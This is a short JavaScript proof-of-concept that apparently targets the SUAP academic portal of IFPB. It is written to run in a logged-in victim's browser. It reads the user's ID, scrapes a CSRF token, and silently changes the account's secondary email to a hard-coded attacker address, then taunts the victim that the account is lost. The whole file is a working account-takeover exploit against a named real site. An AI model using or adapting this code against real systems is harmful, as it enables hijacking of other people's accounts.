let EMAIL_ATACANTE = 'cavalcante.joao@protonmail.ch'

async function getPessoaFisicaPk() {
  usuarioId = await fetch('/').then(res => res.headers.get('User'))
  paginaPk = await fetch('https://suap.ifpb.edu.br/autocompletar/rh/pessoafisica/?q=' + usuarioId).then(res => res.text())
  indexPk = paginaPk.search('[|]') + 1
  return paginaPk.substring(indexPk)
  
}

async function getCsrfToken(pessoaFisicaPk) {
  trocarEmailHtml = await fetch("https://suap.ifpb.edu.br/comum/atualizar_email_secundario/" + pessoaFisicaPk)
    .then(res =>res.text())
    let parser = new DOMParser();
    let paginaTrocaEmail = parser.parseFromString(trocarEmailHtml, "text/html");
    csrfToken = paginaTrocaEmail.querySelector("input[name='csrfmiddlewaretoken']").value
    return csrfToken
  }

async function trocarEmail(pessoaFisicaPk, csrfToken) {
  res = await fetch("https://suap.ifpb.edu.br/comum/atualizar_email_secundario/" + pessoaFisicaPk, {
  "credentials": "include",
  "headers": {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,pt-BR;q=0.8,pt;q=0.5,en;q=0.3",
      "Content-Type": "application/x-www-form-urlencoded",
      "Upgrade-Insecure-Requests": "1",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-User": "?1"
  },
  "referrer": "https://suap.ifpb.edu.br/comum/atualizar_email_secundario/" + pessoaFisicaPk,
  "body": "csrfmiddlewaretoken=" + csrfToken + "&email_secundario=" + EMAIL_ATACANTE + "&atualizaremailaluno_form=Aguarde...",
  "method": "POST",
  "mode": "cors"
  });
  return res.status
}

async function poc() {
  pessoaFisicaPk = await getPessoaFisicaPk()
  csrfToken = await getCsrfToken(pessoaFisicaPk)
  status = await trocarEmail(pessoaFisicaPk, csrfToken)
  return status

}

//arrastavel = document.querySelector('[draggable="true"]')
//arrastavel.textContent = 'Deu certo! Agora espera um pouquinho...'
poc().then(() => document.write('Beleza! Você acabou de perder sua conta :D'))
